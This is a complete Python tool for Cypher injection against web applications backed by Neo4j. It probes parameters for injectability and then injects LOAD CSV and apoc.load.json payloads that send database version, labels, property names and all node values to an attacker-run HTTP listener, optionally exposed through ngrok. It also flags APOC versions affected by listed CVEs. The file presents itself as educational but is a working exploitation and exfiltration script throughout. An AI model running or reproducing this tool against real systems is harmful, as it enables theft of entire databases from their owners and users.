#!/usr/bin/python3
import argparse
import requests
import urllib.parse
import threading
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
import netifaces as ni
import queue
import re
import sys
import json
import os
from tabulate import tabulate
from pyngrok import ngrok
from packaging import version


data_queue = queue.Queue()

# Helper functions
def get_ip_address(network_interface):
    """Retrieve the IP address for a given network interface."""
    return ni.ifaddresses(network_interface)[ni.AF_INET][0]['addr']

def extract_query_params(query_string):
    """
    Extracts param=value into json format
    """
    pattern = re.compile(r'([^&=?]+)=([^&=?]+)')
    matches = pattern.findall(query_string)
    return {key: value for key, value in matches}


def convert_dict_to_table(data):
    from tabulate import tabulate

    
    if not data:
        return "The input data is empty."
    
    # add header ID
    headers = ['ID'] + list(next(iter(data.values())).keys())
    table_data = []

    for index, attributes in data.items():
        # create a row for each item, prepending the index
        # skip ID header
        row = [index] + [attributes.get(header) for header in headers[1:]]  
        table_data.append(row)

    # Use tabulate to generate the table
    table = tabulate(table_data, headers=headers, tablefmt="grid")
    print(table)


def fully_dynamic_convert_data(original_data):
    
    converted_data = {}

    # Process each key in the original dictionary
    for key, compound_value in original_data.items():
        # Split the compound value into components based on '::'
        components = compound_value.split('::')
        
        # Iterate over each component
        for component in components:
            # Split the component into index and the actual value, after decoding
            index, value = component.split(':', 1)
            value = value.replace('%20', ' ')

            # Ensure a dictionary for the index exists in converted_data
            if index not in converted_data:
                converted_data[index] = {}

            # Assign the value to the correct key within the indexed dictionary
            converted_data[index][key] = value

    # Ensure all dictionaries have all keys from the original data, set to None if not present
    all_keys = list(original_data.keys())
    for index_dict in converted_data.values():
        for key in all_keys:
            index_dict.setdefault(key, None)

    return converted_data

def check_vulnerability(apoc_version):
    """
    Checks if the given version is affected by any of the vulnerabilities.

    Parameters:
    - version_to_check (str): The version of APOC to check.
    - vulnerability_data (dict): A dictionary containing vulnerability information.
    (0, "version") 0: lower bound
    """
    vulnerability_data = {
        "CVE-2021-42767: Path traversal in several apoc.* functions": [("0", "3.5.0.17"), ("0", "4.2.0.10"), ("0", "4.3.0.4"), ("0", "4.4.0.1")],
        "CVE-2022-37423: Partial Path Traversal Vulnerability": [("0", "4.4.0.8"), ("0", "4.3.0.7"), ("0", "4.2.0.12"), ("0", "4.1.0.12"), ("0", "3.5.0.20")],
        "CVE-2022-23532: Path Traversal Vulnerability": [("0", "4.3.0.12"), ("0", "4.4.0.12")],
        "CVE-2023-23926: XML External Entity (XXE) vulnerability in apoc.import.graphml": [("0", "4.4.0.14")]
    }
    affected_advisories = []
    counter = 0
    current_version = version.parse(apoc_version)
    for advisory, affected_ranges in vulnerability_data.items():
        for lower, upper in affected_ranges:
            if version.parse(lower) <= current_version < version.parse(upper):
                affected_advisories.append(advisory)
                counter += 1
                break  # Stop checking other ranges for this advisory if already found affected

    if affected_advisories:
        print(f"\nAPOC Version {apoc_version} is affected by these vulnerabilities [{counter}]:")
        for advisory in affected_advisories:
            print(f"[*] {advisory}")
    else:
        print(f"APOC Version {apoc_version} is not affected by the known vulnerabilities.")

    

class RequestHandler(BaseHTTPRequestHandler):
    """Handles HTTP GET requests."""
    def do_GET(self):
        data_queue.put(self.path)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Received")
    
    def log_message(self, format, *args):
        return

class Listener():
    """A simple HTTP server listening for data."""
    def __init__(self, port):
        self.server = HTTPServer(("0.0.0.0", port), RequestHandler)

    def start_listener(self):
        self.server.serve_forever()

    def stop_listener(self):
        self.server.shutdown()

class Neo4jInjector:
    """Handles the injection of payloads into a Neo4j database."""
    def __init__(self, target, exfil_ip, listen_port, request_type, parameters, cookie=None):
        self.target = target
        self.exfil_ip = f"{exfil_ip}:{str(listen_port)}"
        self.request_type = request_type
        self.parameters = parameters
        self.cookie = cookie if cookie else ""
        self.headers = {'User-Agent': 'curl/8.5.0', 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': self.cookie}
        self.proxies = {'http': 'http://127.0.0.1:8080'}

    def inject_payload(self, payload):
        """Inject a crafted payload to the target."""
        for injection_character in ["-1", "'", "\""]:
            full_payload = f"{injection_character}{payload}"
            encoded_payload = urllib.parse.quote(full_payload, safe='')
            url, data = self.prepare_request_data(encoded_payload)
            self.execute_request(url, data)

    def prepare_request_data(self, encoded_payload):
        """Prepare the URL and data for the request."""
        if self.request_type == "API":
            url = f"{self.target}{self.parameters}{encoded_payload}"
            data = None
        elif self.request_type == "GET":
            url = f"{self.target}?{self.parameters}={encoded_payload}"
            data = None
        elif self.request_type == "POST":
            url = self.target
            data = f"{self.parameters}={encoded_payload}"
        else:
            raise ValueError("Invalid request type")
        return url, data

    def execute_request(self, url, data=None):
        """Execute the HTTP request with the prepared data."""
        try:
            response = requests.post(url, data=data, headers=self.headers, proxies=self.proxies, allow_redirects=False) if data else requests.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False)
            if response.status_code == 302:
                print("302 Redirect, Cookies Expired/Invalid ?")
                sys.exit()
            elif response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
                return response
        except requests.exceptions.RequestException as e:
            print(f"Error occurred: {e}")

        return None

    def detect_inject(self):
        print("Determining if the target is injectable")
        injection_characters = ["'", "\"", "-1"]
        working_char = ""
        or_case = None
        and_case = None
        for injection_character in injection_characters:
            if (injection_character == "-1"):
                payload = f" OR 1=1"
            else:
                payload = f" OR 1=1 OR 'g' = {injection_character}g"
            full_payload = f"{injection_character}{payload}"
            encoded_payload = urllib.parse.quote(full_payload, safe='')
            url, data = self.prepare_request_data(encoded_payload)
            response = self.execute_request(url, data)
            if (response):
                working_char = injection_character
                or_case = response
                break

        if (working_char == "-1"):
            full_payload = f"{working_char} AND 1=1 AND 1=0"
        else:
            full_payload = f"{working_char} AND 1=1 AND 1=0 AND 'g' = {working_char}g"
        encoded_payload = urllib.parse.quote(full_payload, safe='')
        url, data = self.prepare_request_data(encoded_payload)
        and_case = self.execute_request(url, data)
        
        return (and_case and and_case.headers["Content-Length"] != or_case.headers["Content-Length"])

    def exfil_data(self):

        print("\n[*] APOC Check [*]")
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL apoc.load.json('{self.exfil_ip}/?apoc_version=' + apoc.version()) YIELD value RETURN value//")
        apoc_installed = True
        if data_queue.empty():
            parsed_data = {'apoc_installed': 'False'}
            apoc_installed = False
        else:
            data = data_queue.get()  # Retrieve the next item from the queue
            parsed_data = extract_query_params(data)  # Use the previously defined function
        
        nested_dict = {'-': parsed_data}
        convert_dict_to_table(nested_dict)

        if apoc_installed:
            apoc_version = parsed_data['apoc_version']
            check_vulnerability(apoc_version)
            option = input("\nUse APOC to exfiltrate? (Y|N): ").lower()
            if option == "y":
                return True
            elif option == "n":
                print("\n[*] Continuing with LOAD CSV [*]")
       



        print("\n[*] Version Check [*]")
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT name,version,edition LOAD CSV FROM '{self.exfil_ip}/?neo4j_version=' + version + '&name=' + replace(name,' ','') + '&edition=' + edition as l RETURN 0 as _0//")

        data = data_queue.get()  # Retrieve the next item from the queue
        parsed_data = extract_query_params(data)  # Use the previously defined function
        nested_dict = {'-': parsed_data}
        convert_dict_to_table(nested_dict)


        # dump label count
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l LOAD CSV FROM '{self.exfil_ip}/?label_count='+l as x RETURN 0 as _0 //")

        data = data_queue.get()  # Retrieve the next item from the queue
        parsed_data = extract_query_params(data)  # Use the previously defined function
        label_count = parsed_data.get('label_count')  # Extract the label value
        
        # dump labels
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH DISTINCT label LOAD CSV FROM '{self.exfil_ip}/?label='+label as l RETURN 0 as _0 //")

        # Store labels
        labels = []
        for _ in range(int(label_count)):
            data = data_queue.get()  # Retrieve the next item from the queue
            parsed_data = extract_query_params(data)  # Use the previously defined function
            label_value = parsed_data.get('label')  # Extract the label value
            labels.append(label_value)

        print(f"\navailable labels [{label_count}]:")
        for label in labels:
            print(f"[*] {label}")


        label = input(f"\nEnter label to dump: ")

        
        # Dump property count
        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as y LOAD CSV FROM '{self.exfil_ip}/?property_count=' + y as l RETURN 0 as _0 //")

        data = data_queue.get()  # Retrieve the next item from the queue
        parsed_data = extract_query_params(data)  # Use the previously defined function
        property_count = parsed_data.get('property_count')  # Extract the label value

        # dump properties
        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as all_properties WITH REDUCE(mergedString = '', value in all_properties | mergedString+value+'::') as joinedString  LOAD CSV FROM '{self.exfil_ip}/?keys='+replace(joinedString,' ', '%20') as x RETURN 0 as _0 //")

        data = data_queue.get()
        # remove trailing ::
        parsed_data = extract_query_params(data[0:-2])
        print(f"\navailable properties [{property_count}]:")
        properties = parsed_data['keys'].split('::')
        for pr0perty in properties:
            print(f"[*] {pr0perty}")


        properties_dict = {}
        for pr0perty in properties:
            self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) WITH id(x) + ':' + x.{pr0perty} as id_{pr0perty} WITH COLLECT(DISTINCT(id_{pr0perty})) AS id_{pr0perty} WITH REDUCE(mergedString = '', value in id_{pr0perty} | mergedString+value+'::') as  joinedString LOAD CSV FROM '{self.exfil_ip}/?{pr0perty}='+replace(joinedString,' ', '%20') as x RETURN 0 as _0 //")
            data = data_queue.get()
            parsed_data = extract_query_params(data[0:-2])    
            properties_dict.update(parsed_data)
        properties_dict = fully_dynamic_convert_data(properties_dict)
        
        print(f"\nLabel: {label}")
        print(f"[{property_count} columns]")
        convert_dict_to_table(properties_dict)


    def apoc_exfil_data(self):
        print("\n[*] Using APOC to Exfiltrate [*]")

        print("\n[*] Version Check [*]")
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT name,version,edition CALL apoc.load.json('{self.exfil_ip}/?neo4j_version='+version + '&name=' + replace(name,' ','') + 'edition=' + edition + '&apoc_version=' + apoc.version()) YIELD value RETURN value//")

        data = data_queue.get()  # Retrieve the next item from the queue
        parsed_data = extract_query_params(data)  # Use the previously defined function
        nested_dict = {'-': parsed_data}
        convert_dict_to_table(nested_dict)



        # dump label count
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l CALL apoc.load.json('{self.exfil_ip}/?label_count='+l) YIELD value RETURN value//")

        data = data_queue.get()  # Retrieve the next item from the queue
        parsed_data = extract_query_params(data)  # Use the previously defined function
        label_count = parsed_data.get('label_count')  # Extract the label value

            
        # dump labels    
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() YIELD label WITH DISTINCT label WITH COLLECT(label) as all_label CALL apoc.load.json('{self.exfil_ip}/?labels='+apoc.text.join(all_label, '::')) YIELD value RETURN value//")

        # Store labels
        data = data_queue.get()
        parsed_data = extract_query_params(data)
        print(f"\navailable labels [{label_count}]:")
        labels = parsed_data['labels'].split('::')
        for label in labels:
            print(f"[*] {label}")


        label = input(f"\nEnter label to dump: ")


        # dump property count
        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as y CALL apoc.load.json('{self.exfil_ip}/?property_count=' + y) YIELD value RETURN value//")


        data = data_queue.get()  # Retrieve the next item from the queue
        parsed_data = extract_query_params(data)  # Use the previously defined function
        property_count = parsed_data.get('property_count')  # Extract the label value


        # print("Dumping Properties")
        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as all_properties CALL apoc.load.json('{self.exfil_ip}/?keys=' + apoc.text.join(all_properties,'::')) YIELD value RETURN value//")

        data = data_queue.get()
        parsed_data = extract_query_params(data)
        print(f"\navailable properties [{property_count}]:")
        properties = parsed_data['keys'].split('::')
        for pr0perty in properties:
            print(f"[*] {pr0perty}")


        properties_dict = {}
        for pr0perty in properties:
            self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) WITH id(x) + ':' + x.{pr0perty} as id_{pr0perty} WITH COLLECT(DISTINCT(id_{pr0perty})) AS id_{pr0perty} CALL apoc.load.json('{self.exfil_ip}/?{pr0perty}=' + apoc.text.join(id_{pr0perty}, '::')) YIELD value RETURN value//")
            data = data_queue.get()
            parsed_data = extract_query_params(data)
            properties_dict.update(parsed_data)

        properties_dict = fully_dynamic_convert_data(properties_dict)
        
        print(f"\nLabel: {label}")
        print(f"[{property_count} columns]")
        convert_dict_to_table(properties_dict)


def main():
    parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--parameters", default="", help="Vulnerable parameters")
    parser.add_argument("-c", "--cookie", help="Optional cookie in format key=value")
    parser.add_argument("-t", "--type", required=True, choices=['API', 'GET', 'POST'], help="Request type")
    parser.add_argument("-i", "--int", help="Network interface for dynamic IP retrieval, 'public' for ngrok")
    parser.add_argument("--listen-port", type=int, default=80, help="Listener port")
    args = parser.parse_args()

    listener = Listener(args.listen_port)
    listener_thread = threading.Thread(target=listener.start_listener, daemon=True)
    listener_thread.start() 

    if args.int == "public":
        ngrok_auth_token = os.getenv("NGROK_AUTHTOKEN")
        if ngrok_auth_token:
            ngrok.set_auth_token(ngrok_auth_token)
        else:
            print("Ngrok auth token not set. Please set the NGROK_AUTH_TOKEN environment variable.")
            sys.exit(1)
        start_ngrok = ngrok.connect(args.listen_port, "tcp")
        url = start_ngrok.public_url.replace("tcp://", "http://")
        hostname, port = url.split("://")[1].split(":")
        args.exfil_ip = f"http://{hostname}"
        args.listen_port = int(port)
        
        print(f"External IP: {args.exfil_ip}, External Port: {args.listen_port}")
    elif args.int:
        args.exfil_ip = f"http://{get_ip_address(args.int)}"
    else:
        args.exfil_ip = "127.0.0.1"


    injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)

    if (args.type == "API"):
        if (injector.detect_inject()):
            print("Target likely injectable, continuing")
        else:
            if (input("Target likely not injectable, continue? (y/n default: n)").lower() != "y"):
                return
    else:
        print("This version of the program only supports injection detection of API methods")

    # Begin exfiltration process
    apoc_installed = injector.exfil_data()
    if apoc_installed:
        injector.apoc_exfil_data()
        
        # dump_hash = input("Do you wish to dump the Neo4j account hash (Y/N)")
        # if dump_hash == "Y":
        #     injector.exfil_password()


    listener.stop_listener()
    listener_thread.join()

    if args.int == "public":
        ngrok.disconnect(start_ngrok.public_url)

if __name__ == "__main__":
    main()